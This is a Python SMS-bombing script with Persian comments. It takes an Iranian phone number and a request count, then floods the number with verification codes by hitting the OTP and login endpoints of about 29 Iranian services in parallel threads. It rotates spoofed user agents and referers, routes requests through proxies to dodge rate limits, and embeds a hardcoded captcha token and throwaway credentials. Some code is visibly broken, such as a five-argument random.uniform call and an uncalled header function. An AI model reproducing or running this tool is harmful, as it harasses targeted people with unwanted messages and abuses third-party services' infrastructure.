from platform import node, system, release
from os import system, name
from re import match, sub
from concurrent.futures import ThreadPoolExecutor
import urllib3
import random
from time import sleep
from requests import get, post, options
import os

import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

def get_headers():
    referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://duckduckgo.com/",
        "https://www.alibaba.ir/",
        "https://snapp.ir/"
    ]
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'application/json',
        'Referer': random.choice(referers),
        'X-Requested-With': 'XMLHttpRequest' # این خیلی مهمه، چون نشون میده درخواست از اپلیکیشن یا ایجکس اومده
    }

def load_fresh_proxies():
    file_path = "valid_proxies.txt"
    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
        with open(file_path, "r") as f:
            proxies = [line.strip() for line in f.readlines() if line.strip()]
        if proxies:
            print(f"\033[32m[+] {len(proxies)} Proxies loaded. Using Proxy Mode.\033[0m")
            return proxies
    
    print("\033[33m[!] No proxies found. Switching to DIRECT MODE (Server IP).\033[0m")
    return [] # لیست رو خالی برمیگردونه

PROXIES_LIST = load_fresh_proxies()

def get_proxy():
    # اگه لیستی وجود داشت، یکی رو انتخاب کن
    if PROXIES_LIST:
        px = random.choice(PROXIES_LIST)
        return {"http": px, "https": px}
    # اگه لیست خالی بود، None برگردون تا درخواست مستقیم ارسال بشه
    return None


def classino(phone):
    classino_url = "https://panel.classino.com/api/v1/auth/login"
    classino_data = {"mobile": "0" + phone.split("+98")[1]}
    classino_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://panel.classino.com",
        "Referer": "https://panel.classino.com/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(classino_url, json=classino_data, proxies=get_proxy(), headers=get_headers, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Classino) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def alibaba(phone):
    alibaba_url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
    alibaba_data = {"phoneNumber": "0" + phone.split("+98")[1]}
    alibaba_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://ws.alibaba.ir",
        "Referer": "https://ws.alibaba.ir/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(alibaba_url, json=alibaba_data, proxies=get_proxy(), headers=alibaba_headers, timeout=5)
        if response.status_code == 200 and response.json().get("success") == True:
            print(f'{g}(Alibaba) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def tetherland(phone):
    tetherland_url = "https://service.tetherland.com/api/v5/login-register"
    tetherland_data = {
        "mobile": "0" + phone.split("+98")[1],
        "device_info": {
            "brand": "Apple",
            "model": "iPhone",
            "browserVersion": "16.6",
            "app_version": "",
            "by": "web",
            "osName": "iOS",
            "osVersion": "16.7.10",
            "browserName": "Mobile Safari",
            "platform": "web",
            "name": "iOS",
            "device": "web"
        },
        "otp_type": "sms",
        "device": "web"
    }
    tetherland_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://service.tetherland.com",
        "Referer": "https://service.tetherland.com/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(tetherland_url, json=tetherland_data, headers=tetherland_headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200 and response.json().get("status") == True:
            print(f'{g}(Tetherland) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def jabama(phone):
    jabama_url = "https://gw.jabama.com/api/v4/account/send-code"
    jabama_data = {"mobile": "0" + phone.split("+98")[1]}
    jabama_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://gw.jabama.com",
        "Referer": "https://gw.jabama.com/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(jabama_url, json=jabama_data, headers=jabama_headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200 and response.json().get("success") == True:
            print(f'{g}(Jabama) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def mobit(phone):
    mobit_url = "https://api.mobit.ir/api/web/v8/register/register"
    mobit_data = {
        "number": "0" + phone.split("+98")[1],
        "hash_1": 1759696242,
        "hash_2": "5dc6c5fe19f1146acc75716845527a7e693e1fe9f0f4ee4d2fbce9d597ce9745"
    }
    mobit_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://api.mobit.ir",
        "Referer": "https://api.mobit.ir/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(mobit_url, json=mobit_data, headers=mobit_headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200 and response.json().get("success") == True:
            print(f'{g}(Mobit) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def smarket(phone):
    smarket_url = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+98")[1]}'
    smarket_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://api.snapp.market",
        "Referer": "https://api.snapp.market/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url=smarket_url, headers=smarket_headers, proxies=get_proxy(), timeout=5).json()
        if response.get('status') == True:
            print(f'{g}(SnapMarket) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def okorosh(phone):
    okorosh_url = 'https://my.okcs.com/api/check-mobile'
    okorosh_data = {
        "mobile": "0"+phone.split("+98")[1],
        "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
    }
    okorosh_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://my.okcs.com",
        "Referer": "https://my.okcs.com/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url=okorosh_url, headers=okorosh_headers, json=okorosh_data, proxies=get_proxy(), timeout=5).text
        if 'success' in response:
            print(f'{g}(OfoghKourosh) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def snap(phone):
    snap_url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    snap_data = {"cellphone": phone}
    snap_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://app.snapp.taxi",
        "Referer": "https://app.snapp.taxi/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url=snap_url, headers=snap_headers, json=snap_data, proxies=get_proxy(), timeout=5).text
        if "OK" in response:
            print(f'{g}(Snap) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def gap(phone):
    gap_url = "https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1])
    gap_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://core.gap.im",
        "Referer": "https://core.gap.im/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = get(url=gap_url, headers=gap_headers, proxies=get_proxy(), timeout=5).text
        if "OK" in response:
            print(f'{g}(Gap) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def tap30(phone):
    tap30_url = "https://tap33.me/api/v2/user"
    tap30_data = {"credential": {"phoneNumber": "0"+phone.split("+98")[1], "role": "PASSENGER"}}
    tap30_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://tap33.me",
        "Referer": "https://tap33.me/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url=tap30_url, headers=tap30_headers, json=tap30_data, proxies=get_proxy(), timeout=5).json()
        if response.get('result') == "OK":
            print(f'{g}(Tap30) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def divar(phone):
    divar_url = "https://api.divar.ir/v5/auth/authenticate"
    divar_data = {"phone": phone.split("+98")[1]}
    divar_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://api.divar.ir",
        "Referer": "https://api.divar.ir/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url=divar_url, headers=divar_headers, json=divar_data, proxies=get_proxy(), timeout=5).json()
        if response.get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{g}(Divar) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def torob(phone):
    phone = '0'+phone.split('+98')[1]
    torob_url = f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}"
    torob_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://api.torob.com",
        "Referer": "https://api.torob.com/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = get(url=torob_url, headers=torob_headers, proxies=get_proxy(), timeout=5).json()
        if response.get("message") == "pin code sent":
            print(f'{g}(Torob) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def one(phone):
    url = "http://app.insatel.ir/client_webservices.php"
    data = f"ac=10&appname=fk&phonenumber={phone}&token=mw0yDKRVld&serial=null&keyname=verify2"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://app.insatel.ir",
        "Referer": "http://app.insatel.ir/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(App.insatel) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def two(phone):
    url = "http://setmester.com/mrfallowtel_glp/client_webservices4.php"
    data = f"ac=9&username=gyjoo8uyt&password=123456&fullname=hkurdds6&phonenumber={phone}&token=1uhljuqBpI&serial=null"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://setmester.com",
        "Referer": "http://setmester.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Setmester) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def tree(phone):
    url = "http://jozamoza.com/com.cyberspaceservices.yb/client_webservices4.php"
    data = f"ac=9&username=sjwo7ehd&password=123456&fullname=dheoe9dy&phonenumber={phone}&token=qqcI33qkGC&serial=null"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://jozamoza.com",
        "Referer": "http://jozamoza.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Jozamoza) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def fwor(phone):
    url = "https://api.nazdika.com/v3/account/request-login/"
    data = f"phone={phone}"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://api.nazdika.com",
        "Referer": "https://api.nazdika.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Nazdika) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def five(phone):
    url = "http://followmember2022.ir/followmember/client_webservices4.php"
    data = f"ac=10&phonenumber={phone}&token=CLTRIcCmcT&serial=null"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://followmember2022.ir",
        "Referer": "http://followmember2022.ir/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Followmember) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def six(phone):
    url = "https://iranstor1.ir/index.php/api/login?sms.ir"
    data = f"fullname=alimahmoodiu&mobile={phone}&device_id=12365478911&token=c5aef1158542ea0932c1916f829d943c"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://iranstor1.ir",
        "Referer": "https://iranstor1.ir/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Iranstor) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def seven(phone):
    url = "https://homa.petabad.com/customer/signup"
    data = f"my_server_api_version=1&platform=android&my_app_type=android&my_app_version=17&time_zone_offset=270&app_name=customer&phone_number={phone}"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://homa.petabad.com",
        "Referer": "https://homa.petabad.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Homa) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def eyit(phone):
    url = "https://takhfifan.com/api/jsonrpc/1_0/"
    data = {"id": 592419288011976410, "method": "customerExistOtp", "params": ["023804109885a10d02158eef65c5d887", {"username": phone}]}
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://takhfifan.com",
        "Referer": "https://takhfifan.com/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, json=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Takhfifan) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def niyne(phone):
    url = "http://baharapp.xyz/api/v1.1/reqSMS.php"
    data = f"phone={phone}&"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://baharapp.xyz",
        "Referer": "http://baharapp.xyz/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Baharapp) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def ten(phone):
    url = "http://serverpv1.xyz/api/v1/reqSMS"
    data = f"phone={phone}&"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://serverpv1.xyz",
        "Referer": "http://serverpv1.xyz/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Serverpv1) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def eleven(phone):
    url = "http://kolbeapp.xyz/api/v1/reqSMS"
    data = f"phone={phone}&"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://kolbeapp.xyz",
        "Referer": "http://kolbeapp.xyz/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Kolbeapp) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def tovelf(phone):
    url = "http://arezooapp.xyz/api/v1/reqSMS"
    data = f"phone={phone}&"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://arezooapp.xyz",
        "Referer": "http://arezooapp.xyz/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Arezooapp) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def therty(phone):
    url = "http://servermv1.xyz/api/v1/reqSMS"
    data = f"phone={phone}&"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://servermv1.xyz",
        "Referer": "http://servermv1.xyz/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Servermv1) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def forty(phone):
    url = "https://core.otaghak.com/odata/Otaghak/Users/ReadyForLogin"
    data = {"userName": phone}
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://core.otaghak.com",
        "Referer": "https://core.otaghak.com/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, json=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Otaghak) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def fifty(phone):
    url = "https://gharar.ir/api/v1/users/"
    data = {"phone": phone}
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://gharar.ir",
        "Referer": "https://gharar.ir/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, json=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Gharar) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def sixty(phone):
    url = "http://serverhv1.xyz/api/v1.1/reqSMS.php"
    data = f"phone={phone}&"
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "http://serverhv1.xyz",
        "Referer": "http://serverhv1.xyz/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(url, data=data, headers=headers, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
            print(f'{g}(Serverhv1) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def sventtubf(phone):
    headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://cyclops.drnext.ir",
        "Referer": "https://cyclops.drnext.ir/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        get_response = get(f"https://cyclops.drnext.ir/v1/doctors/auth/check-doctor-exists-by-mobile?mobile={phone}", headers=headers, proxies=get_proxy(), timeout=5)
        options_response1 = options("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", headers={**headers, "access-control-request-method": "POST", "access-control-request-headers": "content-type"}, proxies=get_proxy(), timeout=5)
        post_response1 = post("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", json={"mobile": phone}, headers=headers, proxies=get_proxy(), timeout=5)
        options_response2 = options("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", headers={**headers, "access-control-request-method": "POST", "access-control-request-headers": "content-type"}, proxies=get_proxy(), timeout=5)
        post_response2 = post("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", json={"mobile": phone}, headers=headers, proxies=get_proxy(), timeout=5)
        
        if all(response.status_code == 200 for response in [get_response, options_response1, post_response1, options_response2, post_response2]):
            print(f'{g}(Drnext) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def is_phone(phone: str):
    phone = sub(r"\s+", "", phone.strip())
    if match(r"^\+989[0-9]{9}$", phone):
        return phone
    elif match(r"^989[0-9]{9}$", phone):
        return f"+{phone}"
    elif match(r"^09[0-9]{9}$", phone):
        return f"+98{phone[1:]}"
    elif match(r"^9[0-9]{9}$", phone):
        return f"+98{phone}"
    else:
        return False

def print_low(text):
    for char in text:
        print(char, end='', flush=True)
        sleep(0.001)

# لیست توابع برای ارسال درخواست‌ها
functions = [smarket, snap, torob, tap30, okorosh, divar, gap, one, two, tree, fwor, five, six, seven, eyit, niyne, ten, eleven, tovelf, therty, forty, fifty, sixty, sventtubf, classino, alibaba, tetherland, jabama, mobit]

# رنگ‌ها
r = '\033[1;31m'
g = '\033[32;1m'
y = '\033[1;33m'
w = '\033[1;37m'

# نمایش لوگو
print_low(f"""
{y}⣀⣀⣀⣀⡀⢀⢀⢀⢀⣀⡀⢀⢀⢀⣀⣀⣀⣀⢀⢀⢀⣀⣀⣀⢀⢀⢀⢀⣀⣀
{g}⣿⡏⠉⠙⣿⡆⢀⢀⣼⣿⣧⢀⢀⢸⣿⠉⠉⢻⣧⢀⣾⡏⠉⠹⠿⢀⢀⢠⣿⣿⡄
{w}⣿⣧⣤⣴⡿⠃⢀⣰⡿⢀⢿⣆⢀⢸⣿⣤⣴⡾⠋⢀⠙⠻⢷⣶⣄⢀⢀⣾⠇⠸⣿⡀
{r}⣿⡇⢀⢀⢀⢀⢠⣿⠛⠛⠛⣿⡄⢸⣿⢀⠘⣿⡄⢀⣶⣆⣀⣨⣿⠂⣼⡟⠛⠛⢻⣧
{y}⠉⠁⢀⢀⢀⢀⠈⠉⢀⢀⢀⠉⠁⠈⠉⢀⢀⠈⠉⢀⢀⠉⠉⠉⠁⢀⠉⠁⢀⢀⠈⠉⠁


{w}𝐆𝐄𝐍𝐄𝐑A𝐓𝐄𝐃 𝐁𝐘 : @𝐏𝐀𝐑𝐒𝐀_𝐆𝐓𝐈𝟔
""")

# دریافت ورودی شماره تلفن
while True:
    phone = is_phone(input(f'{g}[?] {w}Enter Phone Number {g}(+98) {r}- {w}'))
    if phone:
        break
    print(f"{r}Invalid Phone Number!")

# دریافت تعداد درخواست‌ها
while True:
    try:
        tedad = int(input(f'{r}[?] {g}Enter Number of Requests : '))
        if tedad > 0:
            break
        print(f"{r}Number of requests must be greater than 0!")
    except ValueError:
        print(f"{r}Invalid Input! Please enter a number.")

# تابع اصلی برای ارسال درخواست‌ها
def send_requests(phone, count):
    success_count = 0
    total_requests = count * len(functions)
    with ThreadPoolExecutor(max_workers=45) as executor:  # افزایش تعداد کارگرها به 100
        futures = []
        for i in range(count):
            for func in functions:
                futures.append(executor.submit(func, phone))
        
        # نمایش پیشرفت درخواست‌ها
        for i, future in enumerate(futures):
            result = future.result()
            success_count += 1 if result else 0
            print(f"{g}[+] Sending request {i+1}/{total_requests}... {'Success' if result else 'Failed'}")
            sleep(random.uniform(0.1, 0.5, 0.3, 0.4, 0.6))  # کاهش تاخیر به 0.002 ثانیه برای سرعت 5 برابر
    
    # نمایش نتیجه نهایی
    print(f"\n{g}[+] Operation completed!")
    print(f"{w}[*] Total requests sent: {total_requests}")
    print(f"{g}[*] Successful requests: {success_count}")
    print(f"{r}[*] Failed requests: {total_requests - success_count}")

# اجرای برنامه
try:
    send_requests(phone, tedad)
except KeyboardInterrupt:
    print(f'\n{r}[-] User Exited')
except Exception as e:
    print(f'\n{r}[-] Error: {e}')